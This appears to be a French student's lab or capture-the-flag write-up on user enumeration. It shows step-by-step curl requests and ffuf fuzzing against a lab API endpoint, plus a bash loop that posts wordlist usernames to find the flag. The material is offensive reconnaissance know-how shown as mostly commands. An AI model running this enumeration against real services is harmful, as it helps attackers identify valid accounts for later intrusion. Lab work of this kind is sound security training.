on a l IP et le DNS l 'exo nous donne ca :

**Objective**:

Find valid users in the application by exploiting enumeration vulnerabilities.

**What you need to do**:

1. Use `ffuf` with SecLists wordlists
2. Test the `/api/check_username` endpoint to find which users exist
3. Identify which user contains the flag (the flag appears in the JSON response)

on teste :

curl [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username)

``

---

## 🧩 Exercice 0 – User Enumeration (avec `curl`)

### 🎯 But

👉 Savoir si un **username existe**  
👉 Le **flag est dans la réponse JSON**

---

### ✅ Étape 1 — Je teste si l’API répond

curl [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username)

``

👉 Je vérifie que l’endpoint existe.

---

### ✅ Étape 2 — Je teste avec POST (comme une API)

curl -X POST [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username)

👉 L’API n’accepte pas GET, donc j’utilise POST.

---

## 🟢 🔄 3. Tester la méthode (GET → POST)

curl -X POST [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username)

👉 L’API fonctionne avec **POST**

---

# 🟢 📦 4. Ajouter le format JSON

curl -X POST [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username) </span>

-H "Content-Type: application/json"

👉 Le serveur attend du **JSON**

---

# 🟢 👤 5. Tester un faux utilisateur

curl -X POST [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username) </span>

-H "Content-Type: application/json" </span>

-d '{"username":"fakeuser"}'

👉 Réponse :

{"available":true}

👉 ✅ user **n’existe pas**

---

### ✅ Étape 6 — Je teste avec FFUF pour trouver les user potentiel :

ffuf -u "[https://web-80-52-222.cod-eu-west-3.hbtn.io/login?FUZZ=](https://web-80-52-222.cod-eu-west-3.hbtn.io/login?FUZZ=)" </span>

-w parameters-DLH.txt

Ensuite je teste les user name potentiel :

ffuf -u "[https://web-80-52-222.cod-eu-west-3.hbtn.io/login?username=FUZZ](https://web-80-52-222.cod-eu-west-3.hbtn.io/login?username=FUZZ)" </span>

-w usernames-DLH.txt

``

J'enregistre la liste ici de user trouvé avec FFUF :

cut -d' ' -f1 users_all.txt > users_clean.txt

``

---

### ✅ Étape 7 — Je demande à kali d'utiliser curl avec ma liste de user

while read user; do

  echo "Testing $user"

  curl -X POST [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username) </span>

  -H "Content-Type: application/json" </span>

  -d "{"username":"$user"}"

  echo

done < users_clean.txt

---

# 🟢 🔁 8. Tester ta liste avec curl

cd ~/Documents/Github/Ffuf_PLD

while read user; do

  echo "Testing $user"

  curl -X POST [https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username](https://web-80-52-222.cod-eu-west-3.hbtn.io/api/check_username) </span>

  -H "Content-Type: application/json" </span>

  -d "{"username":"$user"}"

  echo

done < users_clean.txt

👉 Tu testes **seulement les bons users**
